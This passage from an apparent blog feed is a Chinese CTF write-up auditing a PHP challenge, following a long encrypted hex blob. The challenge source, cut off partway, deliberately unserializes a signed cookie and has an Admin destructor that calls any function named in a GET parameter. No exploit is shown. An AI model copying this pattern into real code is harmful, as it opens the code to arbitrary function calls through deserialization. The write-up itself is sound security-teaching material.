2b96fe7da1e933205bffbeac248be7302c01a3a09ae7a5fa654682bc5d2674f496d985b8a4a3c6131b54ba4c701248719e181c1d79824e11dd6eeb25a733a458dd74c204cdb70180e3835264e462d64a4cc5482844db712f9bf3f504a04d4a616688b4a0ff7236211ea7117dec3110b456dca05dd6d10459fb78f7f211ca1e7fe3d2117a2c54a237478a2217094ae31b637729161726a3715dcef3470e9cfb4bc78426c957c78add99715dbd6346ce34b130f2022f6718e5350fd7f126befe691afb71afec1b20a09bb4f70fb3a042f572c42bf71821895a9275e0f9aa2bc1aef4e6ba9a98e6c545790eb4436e779be66fb0bbf229aebd6aafc7761c2f3a8740e9dea93564206e2f32008846e03f24a5d60161b4855056a2f6124f506a4b1a160a9a88ab1ab5c3cb36958894c6808d04d8718cec1641803d7f2c90a0ef8bf0feb76454ea88af88b3cbcbfc3c39c73cabc09d17540f20f0cde7b19e20ccd85b949b951668bd058b9ff523fd17178d0742ebb8ce111a6d2ff0fc0fb32c5107c3144c03a7088cb08de936af726f040922d8c684321954d99e3e4bbf8e0354fcf416d106a5cad0564dfe60a684aabdec209fe9adb69ccefe1e38eef9d9692ee7d5c456fae0eddfe2734cdcc8883890c635d35b484fd0f2201b66594d9fa39fcece2528cc491a56a075099b8c9ac1f085d8fc352cdd2002c96e0d6151876e389971bcaef2191ec49445ba93891d4badf22104ef2014929f3f5642c592e15b4824edc564b2b8ea8142d817baa8b8e080e22049206773d92c29496ff6f112a5b872ae15eea88761e6f5174ebb2f5c5c0c43478a33302f9eee81259c71be4d9fb7d3c25311598d1a86901aaa6337fa3a94f138bef93b867a04e55f88f570ecdb0f142abd2f924d93c548bf68d79899b238cd8adbb3e594ac7be2b798a29182bf61ea4f0cb42f82a8cdb1cb37ef250359410382204e924aa68b98e3d728a198318c4cdd330e9796d42d99c6b045d092916be4c4676ff736c56ef00a076a96b8e16bcd8f0ecb0de4a0f0236bb831fa04ec17e5fb69fcdcda62f028e7184865b602d71af3ca0eacf4b38b64bf9c4268ae45df7dd638dc2984d584c387e25d85ae41e29c0312569b573a47fa3a2c6f223e38f805721d4b91cba76b4f9e06b329a8ab4966aff4a50dc3d4b500986f4b71dc5f7e43ad9407e77678e712530c95e81166219d685a4c90022853553e07be006e82677e05f2dc67c4068f57af544ab4256803da5670c728e8fd071557313a2778300dd844e67acfa572e1584a975ab87e28933edabc775dc5f710e2722b590ce0c67c6c0d52c338cdd122d0b77902bca646fe509757faee4a0c7c4f13cd1d7015c3e492d8640e229537fcf1f14501fec1b5685c561a946843498d74894efc59d0da32bf1113d516ef8ca8bc93b9794e39f2107b67c3cfa2be1fded86d43a08cb14263b4bb4463cdb61a07369b001e0370d59a8edfad0b62e7d3f88c5e2a8d6205ce78f2e7d06329c17db5683c8f117dcff448fe3c134a8a28f6f3aabd17bbf31f2ab1185e750840c21cd826e10caaf3b46d67b05763a7626e40d561ac1aa0d611cb21fc055ea4388f6defaef18fb6861f92bb41114f45b5c84b9b925066bab5faa47a38c61ee77492c3a6ce6957528a853815b77b1661dd7b4249d094baaf0d20e06ec5b498e356509e0812c5112b36d004dd687939a37b3dd29d92ed2a21c936d27a49bc066323f06b70e14c1f65f077794049921bde79e7f090c13bad297ae702002f91a2889355eae5f993786f1727ca446c2813429ef23f49b1a00a71b55220092618890a086c6375b17613d3ce8b30a04decba45fd9b69dbb4f9db661c20604000b6857d58fb33a74b0509ead528754f85402a5c755dc514a34d970733d338c49f653a50a961f5841e8bc56faba0923d9814206d4255bd97ffa10176e4efedf47085008c518d409b76a711aa0d65b4196a8af86bb3d1ea99a4bf63d4ec55e1ee3754e49445c8bf1541f724785aa6c03caafa9264996fa6bfd6d472477b55cbb6348ad8c06021cf975e472f997b2ecfac0f7b4265c503055fc635791bc6af8d191952cdb22e2ab6db2720f8cd49bf65f369efccc9af1fd37cf0fd3b06ec8dd1ec6c1ccdb48c44e62788ba1d25ec7029590716277d402bf6906e5cebc0cfc781d899ed969793217360346629bf7e1cf729a271cd879064f65c79be4f3641e7cca4f0241a48ec018a7793a99fb98bc0bbb47824e9711e8b61e496510c8371ea4e95755b352a18f1e06f7bb7b1450d1f66bd25cb7b3163d5b721acbcfc90c61992adc78746f2b9f01a458904fb610d50be888b4a03350d6370ac9656d79b83f6e7b63b277ef464b320614cc5e4df1245cbd4dbdbb874bcc42d953b225ba9c20af055140cffef3d759782b7bc40c19ceeae36bafbc763fd40fcfbd2173c03f6a467f6052856fe818c2d2a8d285a43939c15eacd0cedcdfd3a38276faeb9c81e7ac3cb99ab12755dae718b2520c05ff9731c608e08ef456dd6f21941cfa932c3cde04068d9cc0c528ff94caac61b70bb2af00a28433059130bc0c6476411b28cbafef11a96d4d23b7381372ea373fc0a8e975ddf963c7471a953f48885b831b34ef24461acfc2f5e66bb11379f65f13a41700dda7bb90fcfc9933acdb1c02b3ab6735eb5a703d2f1cd62f510de5f85d99c246d0859ea510798e11588261d1a67f20280f32c4122f3dd9a999c716a2cd0d42d618a0f7dc91a88c4b1aca5ac9d9eff92269dc85e229bda31e100b05884ddfa3eaa5ade8808dc99c1bb843356c62cec3da088a224dbe1bf40861d63bfba150d3eb3dff9992b99e21713e42ddf16f3ba045f495be442e4b497702ea3b110b2186023b17527bdb5237a85410d0b381e8fbdb6eb3fb55f88e5afa8e7fd46d16170f8e484e91c000e735aa34cded690d7f4197d6d203c7a3a7c9838e49815850f94defd7db8aed612a7bc1b71822c6b814f13abb400751ce0595de731f9cf9dbfa2dc3317ed489b5eb467a93559312a8b74d31ec6b8c6bdb363277608d3ff25a8fbf8112df29017f3b12ef8df20beb7bdaf554e75c6e043127a9bef6429bb0ea8ee593c1cb10350e9d74b8d7e3de88b9c9524ffa2dfa1283444463eba4b4486254231c28e610f45d530394d9818ff6014bdfd7198189c2435be2e26eda30066ccfee137806926039b4b252126bf46c64059b3f15e53aa8a8a4f127e7e1b27981e39f34596e072db608a24160e266a95ba1a1c9743e4918915db7dbe30c551db9f7fbc9573d2924186ab561b06f422527e23f1251f82928b986c0781e00fe8aac740ea073064ed5feca57ee40ffdf83ecb139f5f985b917e0e55054af7f7a5cc021381a4d1224df62cd79664cc7a23f9dc7d3c0793bdf94009f1c2ed36a91b33ea23711b7e78e2a5fffdc32e1788253c2f07bd78aabcbae88aa22f0d65c3852f6e6abaddbc67b5fa94260a9966d62c713a3b87d5ba4d98f290c3741a14f9ce038535d2dfaaecd56f688feab97b7a6aa68fe026319fb395788fd83027b2a08bee654636f130883929ac9e86c561e11e3dc7809e2a7042280f54acd0e029e9796bb5eeaaa00ae8dfae12f32552d6ec5d21a3ac6eb84784142f2d9ebe8512c63387f0f71001098fa5838ec36146b5f920fc1500c835cb870aeccfcbf3f19152a3f117eb80f8319e91518d54879990f8153ca64a778ffa9a2a79238fd1ff7356c66c28a388c8487919131076de019cb4e40554d0b808b92807950c199281314d238e13d664e09610e19a91461a0ed061539146806ad5b5bb2122ce6555393f859faf06d34f12ae30f3c66c2ca15fd8f4e517f4bb3d8418f7f5afd7e946b53594e689c95120f04cf41c2bbc902c010e52810c74481af4685b84acff84c6d34c1a24b69e1c2fa9407f3e8763e2e5bd123f573c77b59fb60830030ec86bbc064d73a9be32a63af0a8c5e8d53ce2c7c06b76eb77017bd64932ca3f09027099c7409580cd36d95b985ce4109395e41a9cb0b7a6cab3f0bc3a2494239e95f14550ae6bd2598e208686d0e7728aff750e7590501c752a73e6aafc3563a61b6130fdc2b213dbcbf6ad46e755a32d5d80bf9f929823d2f25e524b453b8ffc1c20f7da0ba1b14ae8dab3058f11aa806377b379304c41d82161ef8909e6e89fb69d7631cdb23deabdc9e599d2dcb246f905f37ca98ec60c27a19780ab13322f01717a20c8ee0b622a29b3a14a9702031eeded0770fc27ee777bad9ef042039d9a05cb06b9b692062f8181a141f64ead458fe743d5ce56195adefbd34894db586d50de3ebb9e9c3f585694cee0807a67da2ac89c50447cb327104d2d2ed2f589c5107a09f84a0da92eb25bb3105d40c50681655d1569ed9277e71679343f05dcadb902718208c84c6df7d58cca79068b915506e21eab9bd39d7ce4af76a90fe924fcd989f70321aba78669430e26fa3cbb1b809be0003b3a1037194a5aba5ea9f443284ea756dabd9ddff44234b64c263c8782c7fcf94e2587a0350a38986cc7dec486a62cee8ce73e940de7fbec7261fd559d3542ba7ef9588d530e83869724535fb4a3f1550b77469ebdd55d4da44f74d0d033fd490786a8b0bed665d1137f2db420d2afe879968c7a4f810b18eff6e063cf3dc82f069457cb3a48b564841f125a1e3cc72a3f01e436ed3713f8218969814749e44fe5c2bc04a2f3c82735b56331cb9cfed773c59debae0e0208b5cdc12ce909930c5c71b2936ebc247b370eff1fce961c99096288d2fa878792a75bbaaf623094ab84826128a99c728729acf87a7080de960551f5322ac5197a5fa38474154c935b978da07dd38d92394c6121e4d6dd5056eb840282fe832e50aa10c149d339696cf08b9b0988567f635505ab870255147b009106c15d49b33b965e8a9cefcc2ca9da504c9889e6843b057e30f6c69b4ad78f16467ae9721e88fd6e547b6d8af8c0bd444cd59a90bcb5d7a60a0ac195c7b9d30801c18bda270821616421abda0c6c276a4ff92f9cd7df3b2fe24b786e0b96f357f6b3e9b4418be22a8add09fecc15c5dd9479da202a25e53804cde1413ee1deb59e46458c6db035ee02a547cd040118cd8ff51c406a49ac02fb79b0f97df6524eadd7b8f1850be77e1e017daaf75d853eab7d8cc078406a18c984a71e6a759b44d8b04779059e36e8d3810cb368740164439ceaecb70222a6fdb727723ae326a27fbaf45c41d0969eed9490143b9e7ce4e1baf54d025dbc2b962d2bf5b8578766c13efaec635cde771ba1160fdf20597cb564ca522a8e926045ba1c89dbaa240b32d1f07a00f385269682f0dc064486190d69979905704d0b66ff37545b6758a1b85072cbd9cddb9bac01ae67b873a2578a65a098518b06f28ede102221b60f1936d3f6ed8c238bf67e30815c26aad7af96369dc6a77ce6c35d85c0a87bb7bd1a25e2ed0ebec861688a03a14c8d30bb6b61dfc95440548f0ad69e5d409f8a3f665bacf30cb041542d067baa113a9623f628533d6dd5219e06ba5503951fcfbba8bf68649191c44f1715cac129fb5e2abcff5aa5ce1a84892933a03310ba5b788871e4da2294663158686341b384061c3dc8e2a315c5289efd7a7b24dbebe1f53c753d11377b35c29176c198769602ca6581c72b89fe6d40456ae59948b7eff6f961e36b63116eecf2e7336adf72160a4246ab2577391a376be2a3b55679485f796a4f48ed1de63ce16c622cd48725bf93b01d2e0bd5d560a09e5ec6481178dc25d6f9f03d0ea0147a744978022bdea46b0f6c717653c2e769224111f9a5b6b315d1d933b79b5c6b32fdf3bbadd93a434402664a7e32831c5e0c2e21a7861c85e9fa55b28f52e1d6cd6954356cb0c15d8837e214f4b0593b9cdd619493f7927ee80b8b5272076fe04b86f209424166864fe67793d8ceb9cfe87d0c2a369f18af2e7f03eba6e11f3330cd7a44a6efb4f9796725b97d0ac702bf02144767d22572f27abdc587c22f23d1524db8aaec57148e2541fb261838e132be4e759afa30c0d83fa50954c0a16348ab15bedc567a247fe37570f8f61978140cc2067d273028599889e1edcb20af8051633519e6a4f73b8e4df214fcd59d1e19ec30a34fa49359be76c26fbcfd2a1592c545cbaea461a6bfff3cade02ed365fc4f452e98202d4b0af8816c132df6a33223cec731443de33048fbc4f77dea2221c4adfcd72394f8816657d425c1dffe4db282411bf886ed84a23633ef240745cee76c0e4bee016af9c0c48c64a42512e521015d7e5d771d2aeae0fb4f74d8b897729f03376ca7e79166422a22a4716b8960e564f8911e3cfed4d0ccba24da48edab9a0fc0c700b04551bf8dd496b5e72f561b60a2fdabde8582fbfaade1f0053e6dae18f88b640702b81da7ecc07da7c8cbf0b06d610b23960b26552a1537fc34b0df0a9f2f45ac9083583a9fa2006295c74dd427ca359724d2095e1ce44db4637f897dec748068797053ed88983fcc7fe3c634586adc120073f3e969d55c56a951abbbcea0ed6472d6201775c5e4d9da3c807d91924336adf27292718ec93ad90edf93a6f79e1eba5fc7ea91d970f3aaa43a29f60f7f868bc2181bdeb27281b318ceef96773d4879ae772efe9a9d95374192dd9a35e54348434dfcd969e3f291d88b9de7226651c4996c306a1808ba4eb07c2d491d99ca41707a0626e553d5a2c63c2a79f53e4ed051dce3666e06edcf6b831e644514ebdf5ff2e5f05af2c79646f936c4eb7121f43422c2050bbd2a6d9421637c7e9ea9e61fa3f0268b8f632186faec193b4214d8671620874c772b1dd0bdf5d1acc313359091c16b0114fc5a7430f045ba31f5eda77a05db6f618603e3bfbe6a500bbcddbf9b6a9d2b0c3ea3c7ffe8c86e6c2fbf8c3e8111368b9c5be45607299b5661bd0daecf4f54d0cddfa53939290291e020fda698fb6ac51abd59859453873ebd5eacd2d94e30ddcb7e115d5b9988a487378f2af3402f8857b61c542f7b89d9d83899afe35a13e3920b13fe715b9a583b66a8f26841d2ae71cae12e2813c284cf8c9ae6a1bb6d83e532de73725dc15e46c6e6a9895255c1e57bd4870fb09609d4c565c3812d388c4bf3d25c437056badd650372fab0f3a9871cbc9b02af468efa1dc697ba2ab8731643d9b6ba05f8ed4233c99588375f62a0d36c7845176a45b7e5ccc0f194e7f2ae8e0180620948370fb21ffdf66352eb55cecf12c51f6a3ad6d31987836a163b418b1e179daa4fcfc47866309816db1ab2b251fccf3bbb713da2d6d8af824bbf030a21b2af091e1ced8432e0230a8b99b91928d78048262ead82262e37a5f38df0cfd9e37c76829728af428cc0f8337e3e61e0acd8e99499b071729df9ca1fc63d651ce1c0878b5781e8d6af9410f5d51b42bf091cb693319b302b6f38f129d820a2cb875bf7371fa0cb4e40434ae3b08546f20b23cf1dcb0f6b51389e65f7bb1accfa7f06a2ec0280c7e3d036f8dee166353cfbea1ae19a687c9b633f0783b112562aa9a6b70bf6da42754a77c3e889a4dc8a1887d0b8e0b7cec3ee6a730eed172c0a0e69745a190ef928c4c9c3d5d1fb8455abab265476638f256bd306ad980174693bedf7497130f9d5bcf59cacd0346e7415d732186a81423e46bab9c7ac1f077f6bde986963b57e378d05ee9d29b5e18aabe288a824e2eb129d463e618e0b66bfcf8779bf50d682064aa4ac7d94cb762fc62d740caaab767a31ffaba70ba43f4ebef6470246e98a94bd52b504f1fd035a286204bac4a48e5be7cf283735a472c5bb6b5f0ce0e7e9eeee47b567a458f467ca17b133407d487a2ab2aabd41b69ca48615503c011127276c522eb47557b25c7860a430b60379d318cb0eae9a19668e09c41df5d8aee7879dfa8fc111dcbc2c1cf78a5e2168dc8773e7d2944ef48dd55bf8efd419e1ba6a8b1dfa2385d0c2c9a4f3fac54acb68ef269973af27de95f3b77e3590365ed6c11b70c2717300f48adf0882559abefb52b3c23337e4358da3bd056fddf524ab9eabc72550276bce59db431f619d2c1fd009782e7246c18ec22b1bc81c9be493fe7b021542cebddbecc8b8f61ac03115e81639de91193fd00a0c431c6ba9493c78aad6f44133aeda599ec42130a923a3cb45e814d76f42c363be1b59bc6a045ad5c976e2cf00095b791d10bfd31cf2af7669894ed274a7a32d80cb3ab793386223e214df2264e69faf766f343eb3a4eeb1e7216be3b5c970a5b3c3dd8604ea103ae0b2d59421389dec075adbc80388797993e0fd8e196de100f742cc63a790ba3c5b55d9d190c2a5c321ce1a048424b1e8470b462190fb56b90480e63f60a954f59f9ca2d80949929083af3ab0ad30fd153b1a7e2a99d73d474b17f59b209377ac6387b48dda5e25185da8a4cfd5fa8cd732f301c4ce228f18cbf40b3f193c015358e5c0d0e59322a2d39e34d862590a64f0b5e891ce05b881c999bfa6a973e623f0061fe6ebd8603926743172058ccf95584f11e2f26c8438aeb78bc04009e86a580e787322eadde03a0671913bc3bd29000d3d55842840448ab43dd6f15b31893a8e43a2abcb5058bda3aaab124c8bac54c02bac8b2d7c3e272257fc74f7cc206dbfcef3270f3b3bf374ff40cad900882c65c2286467244f1d4252da926195cb29dc08d460f251a9da7e259c6103b692fccbb63ede44ee949881c8a7e97acca08d6ec877f4b2c4b83741add0d3f84c80fcc9a27774cf43234f59b1b3cbe9cc3ec4930a3288b70d2a58737a80765d02a29f9b9d28d21db8a15bde8a1a0f4a819ef139cbfbd3b766c2759c4c0c857abd92fae688662c735a5deb003b5c587450521c7008c83fa015376862f8c4a7c8d5377d9ababd9b7ee704f2bb39483f54ae92a40d5a3acd9802bc6942d2b1049282f2dea384491b70769edabde75a91533367b265cdbc9aac8781e40e4f4893ea43c803641c11f31fc4e6ab28725d2d1233c7ac0b9e708477ec9e56119aec4812789f74c66dcdced84b26e8973a6095fff08d26a6b8810d5093b7194a8e7025171ad68cd312db97a6195765a634fdfde724f416a18a44d6b4f32f12f904dd0f605fb7e73fbd80b464e32a8da7e909b23d97fc19c877d36049b28bfea9bc588fcbe3a589299e2323fa609b62fb8b8342b7d330face2240f07b9f6042a2d594e34faf11f2f6b10d2a4d3813c4df689775cecfd012e7e7283cda3ab056eb5109089426971cfebde3b14ad7caf8a3bc3df8cc07461cef5060b4fc7ecab9b82b94482c56b6d92df05d31590c3b95515109705ee80919578ddd17d80387814032cb66ecafbe5acc5799afc0fd4248b5cf5df7dca95055772a41cbca83ec9a04abb3e7b13400e209fad9cf56282be9e214c2bdd2f4d20c697463abcad37893458545fc6ef23a4ffcb5591f237012d887a897a334663e15c057d06216038e3a239cd3e4271d9f100823db44a270e870fab4be003be85309bede57d2ed2756c893c9da8f1457cdacd3f403deba2567ddce444c2c55d74af6efc56c2cd52d56d6b036d9c67720abe73fe992366224de04f070208fd76dbad587aa4aaa96f89de39f65249ee121526aaa5762264349fc95c4f63d1a98d0152ada4218fac194372d15ee7540b331a080e7eaecd96bb5c20363e08946b2bcda4882f242d59cdbe6a946bfda2a3a3a01974390b6db76150387140715dcc475d777e4c62f916bc55c319beef8145a27997e7413535b6c3fec14dfa2e42c1aa08a6ccfbb34977f8d90524e5e149021e6393a5e2e59a3a10afb8bdc8b032daadaf89ab7899531fccb0036dd77f18c2bb063e373a13d3049cdc196c69eac8ec1633626a59788b2b9b81f2f333fc3eb1a3d18d242e1a58094c07ca3afc2dde83cb35a5d866d3447eebb6c060a2f71866c851a0b7d41c416898b57850ce9b45a2bf7ab5acd32c464297faf740ca6189767c661c61c89fff954a3a25997cea909007b75fdcc15e45f62e20bd36f40691aac71b5e2664589b8ba89162ad2c01582f003218c14cd9a666862f6849dfe9dadb2fc3f8b90e6148fa57413b436f827bbe690b87d069b1731fc9535cd73ec6eeb11ae2a1bb2317dc9a2ca3d2f583a5fe43e0ad33b11a6119741113a83147c2bae7ee713118bde377f2f57164c0c44d2b30a06d2e7c7d2772dae0cca2e5c17b05513d293fe0d816377aaadfa99b82f1f9fa8d08e8f4a1a366d96f78b1d2b73ea12c44df13a189bc02cbc967c166b5c57bcb57cf1428f01d4660ca3aaf38dd6f28ee089666bd75dfbc089556c26d77dfbdfa4e65b2b59a552f50e6e01512e656fbef76badec5f0525bb4222d17504153fe2670e8f8ca0f8a264e16a76acc6cafcfd21551b059e214178277b2c6175e98097408df1d9bb8f5858a546e3bbcb8892bf23a51d12a9fde119bded058b50a0071c96ff499babfeec9a53a7fab3622e24d4c331d23cf6c0e34f77ad8ea57f7c2e613eeba7a01361d90f292dde26c5dca04f65d585339900e609094407f71f6aaa310eea9ab2a143581a965178e49356425d7940f650950635e06a92371407fba81e3b0fe53f1516f6c38ebda1271c10511e3f344f638d64b929120b6c68db9d683e35462c344d6f87b7a21d4c40bd22c4be758b79362098ff7d4447f316adb4d5706e1f7eadf1914e3dd5ca0836956c096eca7c5328b1e7e7a8b6d93271095b275de8c80aadca892dfa265c2aadb9ee86052e8e2fba7b4b32cf079346b86c43dfb6fc24294b929bd800f25d6547f4ac1cdc14a394637d1c50754e3c46b11adce5e40c8aa8f1737c8e25c5b4ab6504e5f7137c727e527e621738bfe2f3cf6783ce4ddd604fe2c9cb65e7d61e57e47cac20bb06cb45a7b0b4ab9bdad8a246bdb88516cfd0dae0fa009d0de22e46c58498eb31b5658201610f0ac178d9f4a58978b294b4086712e04dd0df534b4b16832ca5869b1fa57dc3e70f12349d2e303a0ce618071b3d8b10392f6a81b909468b433b14890c2fedc192a7a5099a4b159c8704b84fe4f856b29fbfa37a7a86c95a0ef56a3e0c82baf87f2af5e776db85998ca06434c1c582e8d454dbe4a12de63d4719475030b78d239fcdc9607a0814fe85fcac7b9aeafaa740d93763211ae84bbe040359fcb59581f45c583cea87690f6b06671ef5dabc5cd5bab3f16730107af3cc692b8b606dc22035090e4a436bb2303460c54425f1e9c865f2e4233e22b5e25885dea7ba6b0e1906da0b0cbae2173b672def601ace73ec0a58fd83c0482b44cd7851319e0695e268d0ca48269e21a6e07851b250d518328daa51239297a2bc01daeaede541cbf73f6b5a79aa737cccf6446025eec6532aee9753acb3ecde2e8706c424feba90aca25251f2b95fa961402c1867ee046053e2d8d78f9be5382148141b2e34592a01257dbdc7dc2e0ec77c5e8c829f5bcbe8cacf1cfb69fde32644ae63a77fc264097575c855e1dab187a0aa30b62289343a1803953c8bea62dc399da559d11cab262bc31219d9520a20d715aed1888ba7700afc8bd173cc08b7eff50273debc0afcc21314c22fc0e8dbbeddb8ce7266dc6f2baa86c5d98bc7b6ed8a9afa6a981bea87540e7c52d48ed724a528de00e31075dec83332d004ff3188324bc6770fa424447e122943ee2baf33e84c6bda34f82b3481d1b8fe830eebcdef495e520d93455984cb4d34f203f4a7facd5f772e574dde154ad36d1f810ce94c62732eb2965bae08b514861536ef62afdaf106e57bb2a6f91c7474438cfd93a2ea1f654d189bf48a5c591bc40615a0f4777e256d7fa7af1426dc095ea2ce1415adefb3a5531c46e80c97d9d957e223e2f3d34b7103c0ad806d4e5046ac16daa3b2316802f134254381b9dfbde9ba45db47c1be2bfe72448561db8efec13a4ad50bf41184e8c7741a378b832c364ad6281cf80c2eb690d5edfb58a721dfead67267a4d2bd5c23b61482978b93d35609092816ab9398ad4b604d379670c74be70bc03eba07282cc3dde6d45dd0bf09544942ca59b90631751fd7d8abf60cbe95653a5a47bbcd085caa03e336a28c9108f3190e55af1357351d5aeb1a75d3f634ea5cde26c0a7b894c08b4b60fe92558d8ad9033523a1473bc5926ed82b2efba098fbf8bb86af99b8e544547ddde012a0e4d0d8607b13359d7dae4c1b60ec38f3945fb8573a2189111df27c0b7a01dc33d6d9453637ea92edf5a39414bb73127a16a93a861adecfc3d0bb5e099625bf5b9679919017d61e09939718207c7f9bdcb1b3ac3937a6fb0da3e73f554c03b47c3a84ced88455a30adffc980d1ba7dcd3ce5312351ca3906d208ba943b318c851857105860abc356896d9d39d452cc27b1b9700c22b4b4e9091cdb30f8ea38ee393de4fb72f76b15fa12fa1f528d8f7b36c3bd2344ab496c13c331e819c6a8891742e59ee828c531139fedd237366de0fe6e1759d56d9d5a4cee2d4144dfe2d1d2987794d899c590c98d29b45ca0adceae9b19a377b95a74c14c9cb4adb659b859b413fddccc1739d8e2b1fbec66c2eec6eca23df07bbb4e2d96db1e63059a80dd5f7c8d291a61bae23bed46b003d92ce2b3e3f9b630c2d8a053a813c1992558c283c0c0e5c1d7fa5f908870822902010df99d</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次CTF拉练</title>
    <url>/2020/06/12/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章讲述了一次CTF拉练的一道php的白盒审计题，该文章也是接着Phar://这篇文章写的，主要是记录一下。</p>
<a id="more"></a>

<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p><img src="/img/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%8B%89%E7%BB%83/index.php.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="string">"/var/www/data/secret"</span>)) &#123; <span class="comment">//判断是否存在secret文件，不存在将写入secret文件，存在读取文件</span></span><br><span class="line">    $SECRET = randomkeys(<span class="number">16</span>); <span class="comment">//生成16随机字符</span></span><br><span class="line">    file_put_contents(<span class="string">"/var/www/data/secret"</span>, $SECRET); <span class="comment">//将生成的16随机字符串写入secret文件</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $SECRET = file_get_contents(<span class="string">"/var/www/data/secret"</span>); <span class="comment">//将整个文件读入一个字符串</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>])) <span class="comment">//判断$_SERVER["HTTP_X_REAL_IP"]是否设置并且非空</span></span><br><span class="line">	$SERVER_IP = $_SERVER[<span class="string">"HTTP_X_REAL_IP"</span>]; <span class="comment">//true就赋值给$SERVER_IP</span></span><br><span class="line"><span class="keyword">else</span> $SERVER_IP = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//false就获取用户的 IP 地址赋值给$SERVER_IP</span></span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . base64_encode(<span class="string">"ctf"</span> . $SERVER_IP); <span class="comment">//路径为/var/www/data/加base64编码(ctf+$SERVER_IP) .代表拼接</span></span><br><span class="line">@mkdir($SANDBOX); <span class="comment">//创建$SANDBOX文件夹 单独的沙盒文件夹</span></span><br><span class="line">@chdir($SANDBOX); <span class="comment">//改变目录$SANDBOX</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123; <span class="comment">//检查变量是否已设置且不为NULL，不存在将</span></span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX)); <span class="comment">//序列化</span></span><br><span class="line">    $hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET); <span class="comment">//生成哈希值，sha1算法，$data加密数据，$SECRET为所使用的密钥，</span></span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac)); <span class="comment">//向客户端发送一个HTTPcookie，唯一的标识对象加上签名作为session-data</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123; <span class="comment">//允许在实例化一个类之前先执行构造方法。</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path; <span class="comment">//标识路径为头像的路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; <span class="comment">//析构函数</span></span><br><span class="line">        $_GET[<span class="string">"lucky"</span>](); <span class="comment">//php 通过GET变量来调用函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randomkeys</span><span class="params">($length)</span></span>&#123;   <span class="comment">//定义生成随机数方法</span></span><br><span class="line">    $output=<span class="string">''</span>;   </span><br><span class="line">    <span class="keyword">for</span> ($a = <span class="number">0</span>; $a&lt;$length; $a++) &#123;   </span><br><span class="line">        $output .= chr(mt_rand(<span class="number">0</span>, <span class="number">0xFF</span>));    <span class="comment">//生成php随机数   </span></span><br><span class="line">     &#125;   </span><br><span class="line">     <span class="keyword">return</span> $output;   </span><br><span class="line"> &#125;   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span> </span>&#123; <span class="comment">//定义读取flag方法</span></span><br><span class="line">    $flag = file_get_contents(<span class="string">"/flag"</span>);		<span class="comment">//把文件字符串读取赋值给$flag</span></span><br><span class="line">    <span class="keyword">echo</span> $flag;  <span class="comment">//输出flag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>); <span class="comment">// 从cookie中取出data和hmac签名存到数组（字符串打散为数组）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123; <span class="comment">#判断是否为空</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123; <span class="comment">// 判断data加密之后和hmac签名是否对应</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = unserialize($data); <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123; <span class="comment">//如果反序列化之后的data包含的类中无avatar成员,输出一条消息，并退出当前脚本</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar; <span class="comment">//返回上传路径 </span></span><br><span class="line">&#125;</span><br><span 